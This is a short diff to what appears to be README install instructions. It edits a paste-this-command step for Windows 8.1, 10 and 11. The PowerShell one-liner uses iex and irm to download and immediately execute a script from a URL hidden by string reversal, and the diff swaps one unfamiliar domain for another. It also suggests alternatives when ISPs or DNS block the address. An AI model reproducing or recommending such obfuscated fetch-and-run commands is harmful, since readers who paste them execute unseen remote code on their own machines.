@@ -15,7 +15,7 @@
 2. Copy and paste the code below and press **Enter.**  
    - For **Windows 8.1, 10 and 11**:
      ```
-     iex(irm(-join"dfc.mrtig//:sptth"[-1..-99]))
+     iex(irm(-join"sbs.mrtig//:sptth"[-1..-99]))
      ```
 	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
 	 ```
